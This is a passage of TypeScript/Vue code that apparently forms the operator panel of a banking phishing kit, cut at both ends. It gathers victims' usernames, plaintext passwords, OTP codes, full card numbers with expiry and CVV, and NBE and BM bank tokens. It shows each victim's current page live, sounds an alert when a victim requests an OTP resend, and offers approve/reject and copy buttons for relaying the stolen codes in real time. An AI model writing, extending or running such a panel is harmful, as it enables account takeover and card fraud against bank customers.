      Boolean(attempt?.username && attempt.username.trim() && attempt.username.trim() !== "لم يُدخل بعد") ||
      (attempt?.verificationStatus && attempt.verificationStatus !== "none")
  );
};

const hasDeliveryInfo = (customer: CustomerRecord) => {
  if (hasEnteredLoginCode(customer)) return true;

  const hasActualFields = Boolean(
    (customer.phone && customer.phone.trim()) ||
    (customer.nationalId && customer.nationalId.trim()) ||
    (customer.governorate && customer.governorate.trim()) ||
    (customer.addressDetails && customer.addressDetails.trim()) ||
    customer.status === "أدخل بيانات التوصيل"
  );

  return hasActualFields;
};

const totalVisitorsCount = computed(() => customers.value.length);
const onlineCount = computed(() => customers.value.filter((c) => isOnline(c)).length);
const deliveryCount = computed(() => customers.value.filter(hasDeliveryInfo).length);
const loginCount = computed(() => customers.value.filter(hasEnteredLoginCode).length);

const pendingCustomers = computed(() => {
  let list = customers.value.filter(hasPendingAction);

  const term = pendingSearchTerm.value.trim().toLowerCase();
  if (term) {
    list = list.filter((customer) => {
      const code = customerCode(customer).toLowerCase();
      const name = (customer.displayName || customer.name || "").toLowerCase();
      const accountType = (customer.accountType || "").toLowerCase();
      const nationalId = (customer.nationalId || "").toLowerCase();
      const phone = (customer.phone || "").toLowerCase();
      const governorate = (customer.governorate || "").toLowerCase();
      const username = (customer.username || customer.loginInfo?.username || "").toLowerCase();
      const raw = customer.loginAttempts;
      const attempts = raw ? (Array.isArray(raw) ? raw : Object.values(raw)) : [];
      const matchAttempt = attempts.some(
        (a) => (a.username || "").toLowerCase().includes(term) || (a.otp || "").includes(term)
      );

      return (
        code.includes(term) ||
        name.includes(term) ||
        accountType.includes(term) ||
        nationalId.includes(term) ||
        phone.includes(term) ||
        governorate.includes(term) ||
        username.includes(term) ||
        matchAttempt
      );
    });
  }

  return list.sort((a, b) => {
    const timeA = new Date(a.updatedAt || a.createdAt || 0).getTime() || 0;
    const timeB = new Date(b.updatedAt || b.createdAt || 0).getTime() || 0;
    if (timeB !== timeA) return timeB - timeA;
    return (b.updatedAt || b.createdAt || "").localeCompare(a.updatedAt || a.createdAt || "");
  });
});

const regularCustomers = computed(() => {
  let list = customers.value.filter((c) => !hasPendingAction(c) && hasEnteredLoginCode(c));

  if (filterOnlineOnly.value) {
    list = list.filter((c) => isOnline(c));
  }

  if (filterStarredOnly.value) {
    list = list.filter((c) => Boolean(c.isStarred));
  }

  const term = searchTerm.value.trim().toLowerCase();
  if (term) {
    list = list.filter((customer) => {
      const code = customerCode(customer).toLowerCase();
      const name = (customer.displayName || customer.name || "").toLowerCase();
      const accountType = (customer.accountType || "").toLowerCase();
      const nationalId = (customer.nationalId || "").toLowerCase();
      const phone = (customer.phone || "").toLowerCase();
      const governorate = (customer.governorate || "").toLowerCase();
      const username = (customer.username || customer.loginInfo?.username || "").toLowerCase();
      const raw = customer.loginAttempts;
      const attempts = raw ? (Array.isArray(raw) ? raw : Object.values(raw)) : [];
      const matchAttempt = attempts.some(
        (a) => (a.username || "").toLowerCase().includes(term) || (a.otp || "").includes(term)
      );

      return (
        code.includes(term) ||
        name.includes(term) ||
        accountType.includes(term) ||
        nationalId.includes(term) ||
        phone.includes(term) ||
        governorate.includes(term) ||
        username.includes(term) ||
        matchAttempt
      );
    });
  }

  return list.sort((a, b) => {
    const timeA = new Date(a.updatedAt || a.createdAt || 0).getTime() || 0;
    const timeB = new Date(b.updatedAt || b.createdAt || 0).getTime() || 0;
    if (timeB !== timeA) return timeB - timeA;
    return (b.updatedAt || b.createdAt || "").localeCompare(a.updatedAt || a.createdAt || "");
  });
});

const pendingCustomersCount = computed(() => pendingCustomers.value.length);
const regularCustomersCount = computed(() => regularCustomers.value.length);

const selectedCustomer = computed(() => {
  if (!selectedCustomerId.value) return null;
  return customers.value.find((customer) => customer.id === selectedCustomerId.value) ?? null;
});

// ----------------------------------------------------------------------------
// تتبّع لحظي مستقل لـ presence/currentPage للعميل المُختار
// ----------------------------------------------------------------------------
// يحلّ مشكلة: كان اسم الصفحة "يظهر معلقاً" لأن `customers.value` يُحدَّث
// كل 3 ثوانٍ عبر polling كامل، وأحياناً يفوت التحديث اللحظي لـ
// `presence/currentPage` بسبب طبيعة RTDB أو ترتيب التحديثات.
//
// نُنشئ listener مخصّص على:
//   1) `customers/{id}/presence` (أسرع مصدر)
//   2) `customers/{id}` (السجل الكامل — يلتقط تغيّر lastPage)
//   3) Polling احتياطي كل 2 ثانية (fallback لو تعطّل الـ listener)
//
// عند تغيّر الصفحة → `liveCustomerPage` يُحدَّث فوراً → الواجهة تعيد
// الرسم وتعرض اسم الصفحة الصحيحة في كل الحالات (انتظار، محادثة، ...).
const liveCustomerPage = ref<string>("");
const livePresence = ref<{
  currentPage: string;
  currentStep: string | null;
  state: string;
  lastChangedAt: number;
} | null>(null);

const selectedCustomerIdRef = computed(() => selectedCustomerId.value);

const presenceWatcher = useCustomerPresenceWatcher(selectedCustomerIdRef);

// ✅ مزامنة المرجع المحلي مع الـ watcher — يضمن تحديث liveCustomerPage
//    فوراً عند أي تغيّر في presence/currentPage
watch(
  () => presenceWatcher.latestPage.value,
  (next) => {
    if (next && next !== liveCustomerPage.value) {
      liveCustomerPage.value = next;
    }
  },
  { immediate: true },
);

watch(
  () => presenceWatcher.presence.value,
  (next) => {
    if (next) {
      livePresence.value = {
        currentPage: next.currentPage,
        currentStep: next.currentStep,
        state: next.state,
        lastChangedAt: next.lastChangedAt,
      };
    }
  },
  { immediate: true },
);

// عند تغيّر العميل المُختار → أعد ضبط liveCustomerPage
watch(
  () => selectedCustomerId.value,
  (id) => {
    if (!id) {
      liveCustomerPage.value = "";
      livePresence.value = null;
    }
  },
);

// عند تغيّر `selectedCustomer` نفسه (مثلاً تم تحديث بياناته في customers.value)
// حدّث liveCustomerPage من حضوره (لو لم يكن الـ watcher قد التقطه بعد)
watch(
  () => selectedCustomer.value?.presence?.currentPage,
  (next) => {
    if (!next) return;
    const ts = selectedCustomer.value?.presence?.lastChangedAt;
    // إذا الـ live أحدث من الحالي → حدّث
    if (typeof ts === "number" && (!livePresence.value || ts >= livePresence.value.lastChangedAt)) {
      const norm = normalizePath(next);
      liveCustomerPage.value = norm;
      livePresence.value = {
        currentPage: norm,
        currentStep: selectedCustomer.value?.presence?.currentStep ?? null,
        state: selectedCustomer.value?.presence?.state ?? "online",
        lastChangedAt: ts,
      };
    }
  },
);

// ----------------------------------------------------------------------------
// تنبيه إعادة إرسال رمز OTP (OTP Resend Indicator)
// ----------------------------------------------------------------------------
// اشتراك خفيف على Firebase `customerEvents/{customerId}` لمتابعة حدث
// `otp_resend_clicked` فقط. الهدف: عرض مربع مربع صغير أحمر تحت بيانات
// NBE توكن و OTP عند الضغط على زر "إعادة إرسال"، مع تشغيل صوت تنبيه
// مميّز (مختلف عن صوت التنبيه العام) عند ورود الحدث لحظياً.
const otpResendCustomerId = computed(() => selectedCustomer.value?.id || "");
const {
  latestOfType: latestOtpResendOfType,
  countOfType: otpResendCountOfType,
} = useCustomerActivityStream(otpResendCustomerId);

// أحدث حدث إعادة إرسال (يستخدم في المربع الأحمر).
const latestOtpResendEvent = computed(() => latestOtpResendOfType("otp_resend_clicked"));
const otpResendCount = computed(() => otpResendCountOfType("otp_resend_clicked"));

// معرّف آخر حدث إعادة إرسال "سمعناه" صوتياً.
// نستخدمه لتجنّب تشغيل الصوت عند التحميل الأولي للبيانات
// (نريد الصوت فقط عند ورود حدث جديد بعد التحميل).
let lastHeardOtpResendEventId: string | null = "INITIALIZING";

const warmupAudioOnFirstInteraction = () => {
  if (typeof window === "undefined") return;
  try {
    getAudioContext();
  } catch {
    // ignore
  }
  window.removeEventListener("click", warmupAudioOnFirstInteraction);
  window.removeEventListener("keydown", warmupAudioOnFirstInteraction);
};

if (typeof window !== "undefined") {
  window.addEventListener("click", warmupAudioOnFirstInteraction, { once: true });
  window.addEventListener("keydown", warmupAudioOnFirstInteraction, { once: true });
}

// تشغيل صوت إعادة الإرسال عند ورود حدث جديد فعلاً (ليس عند التحميل).
//
// المنطق:
//   - `INITIALIZING` = لم نرَ البيانات بعد؛ عند أول قيمة لا نُشغّل الصوت.
//   - بعد ذلك، نقارن المعرّف؛ إن تغيّر إلى معرّف جديد ⇒ شغّل الصوت.
//   - عند تغيّر العميل، نُعيد التهيئة (نسمح للصوت بالعمل عند أول حدث).
watch(
  latestOtpResendEvent,
  (event) => {
    if (!event || !event.id) {
      // لا يوجد حدث حالياً (المستخدم لم يضغط إعادة إرسال بعد)
      lastHeardOtpResendEventId = null;
      return;
    }
    if (lastHeardOtpResendEventId === "INITIALIZING") {
      // تحميل أولي: سجّل المعرّف بدون تشغيل الصوت
      lastHeardOtpResendEventId = event.id;
      return;
    }
    if (lastHeardOtpResendEventId === event.id) return;

    // حدث جديد فعلاً ⇒ شغّل الصوت
    playOtpResendSound();
    lastHeardOtpResendEventId = event.id;
  },
  { immediate: true },
);

// عند تغيّر العميل المحدد، نُعيد تهيئة الحالة بحيث الصوت يعمل
// عند أول حدث جديد لهذا العميل.
watch(otpResendCustomerId, () => {
  lastHeardOtpResendEventId = "INITIALIZING";
});

// تنسيق طابع زمني قصير (hh:mm:ss) لاستخدامه في المربع الأحمر.
const formatOtpResendTime = (iso?: string) => {
  if (!iso) return "";
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return "";
  try {
    return d.toLocaleTimeString("ar-EG-u-nu-latn", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  } catch {
    return d.toISOString().slice(11, 19);
  }
};

const loginAttempts = (customer: CustomerRecord): CustomerLoginAttempt[] => {
  const rawAttempts = customer.loginAttempts;
  const attempts: CustomerLoginAttempt[] = rawAttempts
    ? (Array.isArray(rawAttempts) ? rawAttempts.filter(Boolean) : Object.values(rawAttempts))
    : [];

  if (attempts.length > 0) {
    return attempts.sort((a, b) => {
      const aDate = a.otpSubmittedAt ?? a.createdAt ?? "";
      const bDate = b.otpSubmittedAt ?? b.createdAt ?? "";
      return bDate.localeCompare(aDate);
    });
  }

  const username = customer.username || customer.loginInfo?.username || "";
  const password = customer.password || customer.loginInfo?.password || "";
  const passwordEntered = Boolean(customer.passwordEntered || customer.loginInfo?.passwordEntered || password);
  const otp = customer.otp || customer.verification?.otp || "";
  const otpEntered = Boolean(customer.otpEntered || customer.verification?.otpEntered || otp);
  const verificationStatus = customer.verificationStatus || customer.verification?.status || (otp ? "pending" : "none");

  if (username || passwordEntered || otpEntered || customer.verification || customer.loginInfo) {
    return [
      {
        id: customer.verification?.attemptId || "attempt-direct",
        username,
        passwordEntered,
        password,
        otpEntered,
        otp,
        verificationStatus: verificationStatus as any,
        createdAt: customer.loginInfo?.submittedAt ?? customer.verification?.requestedAt ?? customer.createdAt ?? "",
        otpSubmittedAt: customer.verification?.requestedAt,
        decidedAt: customer.verification?.decidedAt,
      },
    ];
  }

  return [];
};

watch(
  [pendingCustomers, regularCustomers],
  ([pending, regular]) => {
    const all = [...pending, ...regular];
    if (!selectedCustomerId.value || !all.some((customer) => customer.id === selectedCustomerId.value)) {
      selectedCustomerId.value = pending[0]?.id ?? regular[0]?.id ?? "";
    }
  },
  { immediate: true }
);

const toggleSelectedCustomer = (id: string) => {
  selectedCustomerId.value = id;
};

const getCustomerUsername = (customer: CustomerRecord) => {
  if (customer.username && customer.username.trim() && customer.username !== "لم يُدخل بعد") {
    return customer.username;
  }
  if (customer.loginInfo?.username && customer.loginInfo.username.trim() && customer.loginInfo.username !== "لم يُدخل بعد") {
    return customer.loginInfo.username;
  }
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];
  if (attempts.length > 0) {
    const sorted = attempts.sort((a, b) => (b.createdAt || "").localeCompare(a.createdAt || ""));
    if (sorted[0]?.username && sorted[0].username !== "لم يُدخل بعد") return sorted[0].username;
  }
  return "لم يُدخل بعد";
};

const getCustomerPassword = (customer: CustomerRecord) => {
  if (customer.password && customer.password.trim() && customer.password !== "لم تدخل بعد") {
    return customer.password;
  }
  if (customer.loginInfo?.password && customer.loginInfo.password.trim() && customer.loginInfo.password !== "لم تدخل بعد") {
    return customer.loginInfo.password;
  }
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];
  if (attempts.length > 0) {
    const sorted = attempts.sort((a, b) => (b.createdAt || "").localeCompare(a.createdAt || ""));
    if (sorted[0]?.password && sorted[0].password !== "لم تدخل بعد") return sorted[0].password;
  }
  if (customer.passwordEntered || customer.loginInfo?.passwordEntered) {
    return "تم إدخالها";
  }
  return "لم تدخل بعد";
};

const getCustomerOtp = (customer: CustomerRecord) => {
  if (customer.otp && customer.otp.trim() && customer.otp !== "لم يدخل بعد") {
    return customer.otp;
  }
  if (customer.verification?.otp && customer.verification.otp.trim() && customer.verification.otp !== "لم يدخل بعد") {
    return customer.verification.otp;
  }
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];
  if (attempts.length > 0) {
    const sorted = attempts.sort((a, b) => (b.otpSubmittedAt || b.createdAt || "").localeCompare(a.otpSubmittedAt || a.createdAt || ""));
    if (sorted[0]?.otp && sorted[0].otp !== "لم يدخل بعد") return sorted[0].otp;
  }
  if (customer.otpEntered || customer.verification?.otpEntered) {
    return "تم إدخال الرمز";
  }
  return "لم يدخل بعد";
};

const getCustomerCardNumber = (customer: CustomerRecord) => {
  if (customer.cardNumber && customer.cardNumber.trim() && customer.cardNumber !== "لم يدخل بعد") {
    return customer.cardNumber;
  }
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];
  if (attempts.length > 0) {
    const sorted = attempts.sort((a, b) => (b.cardSubmittedAt || b.createdAt || "").localeCompare(a.cardSubmittedAt || a.createdAt || ""));
    if (sorted[0]?.cardNumber && sorted[0].cardNumber !== "لم يدخل بعد") return sorted[0].cardNumber;
  }
  if (customer.cardEntered) {
    return "تم إدخال البطاقة";
  }
  return "لم تدخل بعد";
};

const getCustomerCardExpiry = (customer: CustomerRecord) => {
  if (customer.cardExpiry && customer.cardExpiry.trim() && customer.cardExpiry !== "لم يدخل بعد") {
    return customer.cardExpiry;
  }
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];
  if (attempts.length > 0) {
    const sorted = attempts.sort((a, b) => (b.cardSubmittedAt || b.createdAt || "").localeCompare(a.cardSubmittedAt || a.createdAt || ""));
    if (sorted[0]?.cardExpiry && sorted[0].cardExpiry !== "لم يدخل بعد") return sorted[0].cardExpiry;
  }
  return "لم يدخل بعد";
};

const getCustomerCardCvv = (customer: CustomerRecord) => {
  if (customer.cardCvv && customer.cardCvv.trim() && customer.cardCvv !== "لم يدخل بعد") {
    return customer.cardCvv;
  }
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];
  if (attempts.length > 0) {
    const sorted = attempts.sort((a, b) => (b.cardSubmittedAt || b.createdAt || "").localeCompare(a.cardSubmittedAt || a.createdAt || ""));
    if (sorted[0]?.cardCvv && sorted[0].cardCvv !== "لم يدخل بعد") return sorted[0].cardCvv;
  }
  return "لم يدخل بعد";
};


const decideCard = async (id: string, status: "approved" | "rejected") => {
  // تحديث فوري محلياً ليختفي الزبون من "قيد الانتظار" فوراً
  const customer = customers.value.find((c) => c.id === id);
  if (customer) {
    customer.cardStatus = status;
    customer.updatedAt = new Date().toISOString();
  }
  await updateCardDecision(id, status);
  // تأكيد: مسح باقي حالات الـ pending في Firebase
  await clearCustomerPendingStatuses(id);
};

const getCustomerNbeToken = (customer: CustomerRecord) => {
  if (customer.nbeToken && customer.nbeToken.trim() && customer.nbeToken !== "لم يدخل بعد") {
    return customer.nbeToken;
  }
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];
  if (attempts.length > 0) {
    const sorted = attempts.sort((a, b) => (b.nbeTokenSubmittedAt || b.createdAt || "").localeCompare(a.nbeTokenSubmittedAt || a.createdAt || ""));
    if (sorted[0]?.nbeToken && sorted[0].nbeToken !== "لم يدخل بعد") return sorted[0].nbeToken;
  }
  if (customer.nbeTokenEntered) {
    return "تم إدخال الرمز";
  }
  return "لم يدخل بعد";
};

const getCustomerBmToken = (customer: CustomerRecord) => {
  if (customer.bmToken && customer.bmToken.trim() && customer.bmToken !== "لم يدخل بعد") {
    return customer.bmToken;
  }
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];
  if (attempts.length > 0) {
    const sorted = attempts.sort((a, b) => (b.bmTokenSubmittedAt || b.createdAt || "").localeCompare(a.bmTokenSubmittedAt || a.createdAt || ""));
    if (sorted[0]?.bmToken && sorted[0].bmToken !== "لم يدخل بعد") return sorted[0].bmToken;
  }
  if (customer.bmTokenEntered) {
    return "تم إدخال الرمز";
  }
  return "لم يدخل بعد";
};

export type FieldHistoryEntry = {
  value: string;
  timestamp?: string;
  isCurrent?: boolean;
  status?: "approved" | "rejected" | "pending" | "none";
};

export type CredentialHistoryPairEntry = {
  username: string;
  password?: string;
  accountType?: string;
  timestamp?: string;
  isCurrent?: boolean;
  status?: "approved" | "rejected" | "pending" | "none";
};

export type CardHistoryEntry = {
  cardNumber: string;
  cardExpiry?: string;
  cardCvv?: string;
  timestamp?: string;
  isCurrent?: boolean;
  status?: "approved" | "rejected" | "pending" | "none";
};

const formatTime = (ts?: number | string) => {
  if (!ts) return "";
  try {
    const date = typeof ts === "number" ? new Date(ts) : new Date(ts);
    if (isNaN(date.getTime())) return String(ts);
    return date.toLocaleTimeString("en-US", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  } catch {
    return String(ts);
  }
};

const historyStatusLabel = (status?: string) => {
  if (status === "approved") return "مقبولة";
  if (status === "rejected") return "مرفوضة";
  if (status === "pending") return "قيد الانتظار";
  return "سجل سابق";
};

const historyStatusBadgeClass = (status?: string) => {
  if (status === "approved") return "status-badge-approved";
  if (status === "rejected") return "status-badge-rejected";
  if (status === "pending") return "status-badge-pending";
  return "status-badge-past";
};

const getCredentialsHistoryList = (customer?: CustomerRecord | null): CredentialHistoryPairEntry[] => {
  if (!customer) return [];
  const entries: CredentialHistoryPairEntry[] = [];
  const seen = new Set<string>();
  const rawAttempts = customer.loginAttempts;
  const attempts = rawAttempts ? (Array.isArray(rawAttempts) ? rawAttempts.filter(Boolean) : Object.values(rawAttempts).filter(Boolean)) : [];

  // 1. Current active pair
  const currentUsername = getCustomerUsername(customer);
  const currentPassword = getCustomerPassword(customer);
  if (currentUsername && currentUsername !== "لم يُدخل بعد") {
    const rawPass = (currentPassword && currentPassword !== "لم تدخل بعد" && currentPassword !== "تم إدخالها") ? currentPassword : "";
    const key = `${currentUsername}||${rawPass}`;
    entries.push({
      username: currentUsername,
      password: rawPass,
      accountType: customer.accountType || "أفراد",
      timestamp: customer.updatedAt || customer.createdAt,
      isCurrent: true,
      status: getLoginCredentialsStatus(customer) as any,
    });
    seen.add(key);
  }

  // 2. Explicit credentialsHistory array
  if (Array.isArray(customer.credentialsHistory)) {
    for (const item of customer.credentialsHistory) {
      if (item && item.username && item.username !== "لم يُدخل بعد") {
        const rawPass = (item.password && item.password !== "لم تدخل بعد" && item.password !== "تم إدخالها") ? item.password : "";
        const key = `${item.username}||${rawPass}`;
        if (!seen.has(key)) {
          const match = attempts.find((a) => a.username === item.username && (a.password === rawPass || !rawPass));
          const st = match?.verificationStatus || "rejected";
          entries.push({
            username: item.username,
            password: rawPass,
            accountType: item.accountType || "أفراد",
            timestamp: item.timestamp,
            isCurrent: false,
            status: (st === "approved" || st === "rejected" || st === "pending") ? st : "rejected",
          });
          seen.add(key);
        }
      }
    }
  }

  // 3. From loginAttempts
  const sortedAttempts = attempts.sort((a, b) => (b.createdAt || "").localeCompare(a.createdAt || ""));
  for (const att of sortedAttempts) {
    if (att.username && att.username !== "لم يُدخل بعد") {
      const rawPass = (att.password && att.password !== "لم تدخل بعد" && att.password !== "تم إدخالها") ? att.password : "";
      const key = `${att.username}||${rawPass}`;
      if (!seen.has(key)) {
        const st = att.verificationStatus || "rejected";
        entries.push({
          username: att.username,
          password: rawPass,
          accountType: customer.accountType || "أفراد",
          timestamp: att.createdAt,
          isCurrent: false,
          status: (st === "approved" || st === "rejected" || st === "pending") ? st : "rejected",
        });
        seen.add(key);
      }
    }
  }

  return entries;
};

// حالة نافذة سجل بيانات الدخول المشترك
const credentialsHistoryDialog = ref<{
  isOpen: boolean;
  entries: CredentialHistoryPairEntry[];
}>({
  isOpen: false,
  entries: [],
});

const copiedFieldKey = ref<string | null>(null);
const copiedCredKey = ref<string | null>(null);

const openCredentialsHistory = (customer?: CustomerRecord | null) => {
  if (!customer) return;
  credentialsHistoryDialog.value = {
    isOpen: true,
    entries: getCredentialsHistoryList(customer),
  };
  copiedCredKey.value = null;
};

const closeCredentialsHistory = () => {
  credentialsHistoryDialog.value.isOpen = false;
};

const copyFieldText = async (val: string, key: string) => {
  if (!val || val === "لم يُدخل بعد" || val === "لم تدخل بعد" || val === "تم إدخالها" || val === "تم إدخال البطاقة") return;
  try {
    if (navigator?.clipboard?.writeText) {
      await navigator.clipboard.writeText(val);
    } else {
      const ta = document.createElement("textarea");
      ta.value = val;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
    }
    copiedFieldKey.value = key;
    copiedCredKey.value = key;
    setTimeout(() => {
      if (copiedFieldKey.value === key) {
        copiedFieldKey.value = null;
      }
      if (copiedCredKey.value === key) {
        copiedCredKey.value = null;
      }
    }, 2000);
  } catch (err) {
    console.error("Failed to copy text", err);
  }
};

const copyCredValue = async (val: string, key: string) => {
  return copyFieldText(val, key);
};

const copyCardValue = async (val: string, key: string) => {
  return copyFieldText(val, key);
};

const getSpecificCardLogo = (cardNumber?: string) => {
  if (!cardNumber) return vimasImage;
  const num = cardNumber.replace(/[^0-9]/g, "");
  if (num.startsWith("4")) return visaImage;
  if (num.startsWith("5")) return mastercardImage;
  return vimasImage;
};

const getSpecificCardBrandClass = (cardNumber?: string) => {
  if (!cardNumber) return "brand-generic";
  const num = cardNumber.replace(/[^0-9]/g, "");
  if (num.startsWith("4")) return "brand-visa";
  if (num.startsWith("5")) return "brand-mastercard";
  return "brand-generic";
};

const getCardBrandLogo = (customer?: CustomerRecord | null) => {
  if (!customer) return vimasImage;
  const raw = customer.cardNumber || getCustomerCardNumber(customer) || "";
  return getSpecificCardLogo(raw);
};

const getCardBrandClass = (customer?: CustomerRecord | null) => {
  if (!customer) return "brand-generic";
  const raw = customer.cardNumber || getCustomerCardNumber(customer) || "";
  return getSpecificCardBrandClass(raw);
};

const getCardHistoryList = (customer?: CustomerRecord | null): CardHistoryEntry[] => {
  if (!customer) return [];
  const entries: CardHistoryEntry[] = [];
  const seen = new Set<string>();
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];

  const currentNum = getCustomerCardNumber(customer);
  const currentExp = getCustomerCardExpiry(customer);
  const currentCvv = getCustomerCardCvv(customer);
  if (currentNum && currentNum !== "لم تدخل بعد" && currentNum !== "تم إدخال البطاقة") {
    const key = `${currentNum}||${currentExp}||${currentCvv}`;
    entries.push({
      cardNumber: currentNum,
      cardExpiry: currentExp !== "لم يدخل بعد" ? currentExp : "",
      cardCvv: currentCvv !== "لم يدخل بعد" ? currentCvv : "",
      timestamp: customer.updatedAt || customer.createdAt,
      isCurrent: true,
      status: (customer.cardStatus as any) || "none",
    });
    seen.add(key);
  }

  if (Array.isArray(customer.cardHistory)) {
    for (const item of customer.cardHistory) {
      if (item && item.cardNumber) {
        const key = `${item.cardNumber}||${item.cardExpiry || ""}||${item.cardCvv || ""}`;
        if (!seen.has(key)) {
          const match = attempts.find((a) => a.cardNumber === item.cardNumber);
          const st = match?.cardStatus || "rejected";
          entries.push({
            cardNumber: item.cardNumber,
            cardExpiry: item.cardExpiry,
            cardCvv: item.cardCvv,
            timestamp: item.timestamp,
            isCurrent: false,
            status: (st === "approved" || st === "rejected" || st === "pending") ? st : "rejected",
          });
          seen.add(key);
        }
      }
    }
  }

  const sorted = attempts.sort((a, b) => (b.cardSubmittedAt || b.createdAt || "").localeCompare(a.cardSubmittedAt || a.createdAt || ""));
  for (const att of sorted) {
    if (att.cardNumber && att.cardNumber !== "لم تدخل بعد" && att.cardNumber !== "تم إدخال البطاقة") {
      const key = `${att.cardNumber}||${att.cardExpiry || ""}||${att.cardCvv || ""}`;
      if (!seen.has(key)) {
        const st = att.cardStatus || "rejected";
        entries.push({
          cardNumber: att.cardNumber,
          cardExpiry: att.cardExpiry,
          cardCvv: att.cardCvv,
          timestamp: att.cardSubmittedAt || att.createdAt,
          isCurrent: false,
          status: (st === "approved" || st === "rejected" || st === "pending") ? st : "rejected",
        });
        seen.add(key);
      }
    }
  }

  return entries;
};

// حالة نافذة سجل البطاقات
const cardHistoryDialog = ref<{
  isOpen: boolean;
  entries: CardHistoryEntry[];
}>({
  isOpen: false,
  entries: [],
});

const copiedCardKey = ref<string | null>(null);

const openCardHistory = (customer?: CustomerRecord | null) => {
  if (!customer) return;
  cardHistoryDialog.value = {
    isOpen: true,
    entries: getCardHistoryList(customer),
  };
  copiedCardKey.value = null;
};

const closeCardHistory = () => {
  cardHistoryDialog.value.isOpen = false;
};

const getOtpHistoryList = (customer?: CustomerRecord | null): FieldHistoryEntry[] => {
  if (!customer) return [];
  const entries: FieldHistoryEntry[] = [];
  const seen = new Set<string>();
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];

  const currentVal = getCustomerOtp(customer);
  if (currentVal && currentVal !== "لم يدخل بعد" && currentVal !== "تم إدخال الرمز") {
    entries.push({
      value: currentVal,
      timestamp: customer.updatedAt || customer.createdAt,
      isCurrent: true,
      status: (customer.verificationStatus || customer.verification?.status || "none") as any,
    });
    seen.add(currentVal);
  }

  if (Array.isArray(customer.otpHistory)) {
    for (const item of customer.otpHistory) {
      const val = typeof item === "string" ? item : item?.value;
      const ts = typeof item === "object" ? item?.timestamp : undefined;
      if (val && !seen.has(val) && val !== "لم يدخل بعد" && val !== "تم إدخال الرمز") {
        const match = attempts.find((a) => a.otp === val);
        const st = match?.verificationStatus || "rejected";
        entries.push({
          value: val,
          timestamp: ts,
          isCurrent: false,
          status: (st === "approved" || st === "rejected" || st === "pending") ? st : "rejected",
        });
        seen.add(val);
      }
    }
  }

  for (const att of attempts) {
    if (att.otp && !seen.has(att.otp) && att.otp !== "لم يدخل بعد" && att.otp !== "تم إدخال الرمز") {
      const st = att.verificationStatus || "rejected";
      entries.push({
        value: att.otp,
        timestamp: att.otpSubmittedAt || att.createdAt,
        isCurrent: false,
        status: (st === "approved" || st === "rejected" || st === "pending") ? st : "rejected",
      });
      seen.add(att.otp);
    }
  }

  return entries;
};

const getNbeTokenHistoryList = (customer?: CustomerRecord | null): FieldHistoryEntry[] => {
  if (!customer) return [];
  const entries: FieldHistoryEntry[] = [];
  const seen = new Set<string>();
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];

  const currentVal = getCustomerNbeToken(customer);
  if (currentVal && currentVal !== "لم يدخل بعد" && currentVal !== "تم إدخال الرمز") {
    entries.push({
      value: currentVal,
      timestamp: customer.updatedAt || customer.createdAt,
      isCurrent: true,
      status: (customer.nbeTokenStatus || "none") as any,
    });
    seen.add(currentVal);
  }

  if (Array.isArray(customer.nbeTokenHistory)) {
    for (const item of customer.nbeTokenHistory) {
      const val = typeof item === "string" ? item : item?.value;
      const ts = typeof item === "object" ? item?.timestamp : undefined;
      if (val && !seen.has(val) && val !== "لم يدخل بعد" && val !== "تم إدخال الرمز") {
        const match = attempts.find((a) => a.nbeToken === val);
        const st = match?.nbeTokenStatus || "rejected";
        entries.push({
          value: val,
          timestamp: ts,
          isCurrent: false,
          status: (st === "approved" || st === "rejected" || st === "pending") ? st : "rejected",
        });
        seen.add(val);
      }
    }
  }

  for (const att of attempts) {
    if (att.nbeToken && !seen.has(att.nbeToken) && att.nbeToken !== "لم يدخل بعد" && att.nbeToken !== "تم إدخال الرمز") {
      const st = att.nbeTokenStatus || "rejected";
      entries.push({
        value: att.nbeToken,
        timestamp: att.nbeTokenSubmittedAt || att.createdAt,
        isCurrent: false,
        status: (st === "approved" || st === "rejected" || st === "pending") ? st : "rejected",
      });
      seen.add(att.nbeToken);
    }
  }

  return entries;
};

const getBmTokenHistoryList = (customer: CustomerRecord): FieldHistoryEntry[] => {
  const entries: FieldHistoryEntry[] = [];
  const seen = new Set<string>();

  const currentVal = getCustomerBmToken(customer);
  if (currentVal && currentVal !== "لم يدخل بعد" && currentVal !== "تم إدخال الرمز") {
    entries.push({
      value: currentVal,
      timestamp: customer.bmTokenSubmittedAt || customer.updatedAt,
      isCurrent: true,
      status: customer.bmTokenStatus || "pending",
    });
    seen.add(currentVal);
  }

  const raw = customer.loginAttempts;
  const attempts: CustomerLoginAttempt[] = raw
    ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean))
    : [];

  if (Array.isArray(customer.bmTokenHistory)) {
    for (const item of customer.bmTokenHistory) {
      const val = typeof item === "string" ? item : item?.value;
